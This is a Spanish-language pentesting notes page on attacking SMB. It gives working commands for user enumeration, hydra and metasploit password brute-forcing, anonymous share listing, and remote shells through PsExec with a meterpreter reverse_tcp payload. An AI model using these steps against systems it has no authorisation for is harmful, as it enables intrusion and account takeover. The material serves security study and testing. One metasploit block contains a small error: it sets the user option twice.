# SMB

**SMB (Server Message Block)** es un protocolo de intercambio de archivos y periféricos (impresoras y puertos serie) entre equipos de una red local. Utiliza el puerto 445, sin embargo, originalmente SMB funcionaba sobre NetBIOS utilizando el puerto 139. SAMBA es la implementación de código abierto de SMB para Linux y permite que los sistemas Windows accedan a recursos compartidos y dispositivos de Linux.

El protocolo SMB utiliza dos niveles de autenticación:

- Autenticación de usuario: los usuarios deben proporcionar un nombre de usuario y una contraseña para autenticarse ante el servidor SMB y poder acceder a un recurso compartido.
- Autenticación de recurso compartido: los usuarios deben proporcionar una contraseña para acceder a un recurso compartido restringido.

Ambos niveles de autenticación utilizan un sistema de autenticación de desafío-respuesta (challenge-response).

![auth_smb](../../../img/auth_smb.png)

### Identificación de usuarios

Es recomendable enumerar los usuarios antes de realizar un ataque de fuerza bruta para obtener contraseñas. Esto se debe a que al reducir la lista de usuarios, reducimos el tiempo del ataque y la probabilidad de detección.

**Con `smb_enumusers` de `metasploit`:**

```bash
msf > use auxiliary/scanner/smb/smb_enumusers
msf auxiliary(scanner/smb/smb_enumusers) > set rhosts <IP>
msf auxiliary(scanner/smb/smb_enumusers) > run
```

**Con `enum4linux`:**

```bash
enum4linux -U <IP>
```

También podemos volver a enumerar los usuarios con esta herramienta una vez obtenidas las credenciales para tener un mayor alcance:

```bash
enum4linux -u usuario -p contraseña -U <IP>
```

**Con `smb-enum-users` de `nmap`:**

La mayoría de Windows modernos y muchas configuraciones de Samba bloquean la enumeración anónima de usuarios, pero puede funcionar en ciertos casos:

```bash
nmap -p445 --script smb-enum-users <IP>
```

### Obtención de credenciales

**Con hydra**

No funciona en todas las versiones de SMB.

```bash
hydra -l <USR> -P <PASS_WORDLIST> <IP> <SERVICE>
hydra -L <USR_WORDLIST> -P <PASS_WORDLIST> <IP> <SERVICE>
```

**Con metasploit**

```bash
msf > use auxiliary/scanner/smb/smb_login
msf auxiliary(scanner/smb/smb_login) > set rhosts <IP>
msf auxiliary(scanner/smb/smb_login) > set user_file <usr_wordlist>
msf auxiliary(scanner/smb/smb_login) > set pass_file <pass_wordlist>
msf auxiliary(scanner/smb/smb_login) > run
```

### Enumeración de recursos compartidos

**Con `smbclient`**

Si ya tenemos las credenciales podemos listar los recursos a los que tiene acceso el usuario:

```bash
smbclient -L 192.168.1.135 -U usuario
```

En caso contrario, podemos comprobar si un recurso tiene acceso mediante usuario anónimo. Si se obtiene acceso o un error que indique que el acceso ha sido denegado, signifca que el recurso existe aunque no sea accesible.

```bash
smbclient //HOST/share -N -c "ls"
```

Para automatizar esta tarea podemos usar el scritp `smbfuzz` disponible [aquí](https://github.com/mjmariscalr/scripts/tree/main/smbfuzz)

### Ejecución remota de comandos con `PsExec`

**PsExec** es una herramienta desarrollada por Microsoft como sustituto de Telnet. Permite ejecutar procesos en sistemas Windows remotos utilizando las credenciales de cualquier usuario, realizando la autenticación a través de SMB. Podemos usarlo para autenticarnos legítimamente en el sistema objetivo y ejecutar comandos arbitrarios o abrir una shell remota.

Es similar a RDP, pero en lugar de controlar el sistema remoto mediante una interfaz gráfica, los comandos se envían a través de CMD.

Para obtener acceso a un sistema Windows, necesitaremos identificar cuentas de usuario legítimas y sus contraseñas o hashes. Podemos hacerlo con varias herramientas y técnicas; sin embargo, la más común consiste en realizar un ataque de fuerza bruta para iniciar sesión mediante SMB.

Podemos limitar nuestro ataque a cuentas de usuario comunes de Windows, principalmente el usuario administrador, y una vez que hayamos obtenido las credenciales de una cuenta, podemos usarlas para autenticarnos en el sistema con PsExec y ejecutar comandos del sistema u obtener una shell inversa.

**Ejecución de PsExec**

```bash
python psexec.py usuario@host
Password:
C:\Windows\system32>
```

También se encuentra disponible en metasploit:

```bash
msf > use exploit/windows/smb/psexec
msf exploit(windows/smb/psexec) > set payload windows/x64/meterpreter/reverse_tcp
msf exploit(windows/smb/psexec) > set smbuser usuario
msf exploit(windows/smb/psexec) > set smbuser contraseña
msf exploit(windows/smb/psexec) > exploit
meterpreter > 
```

[⟵ Anterior](../../05_sistema.md#explotación-windows)
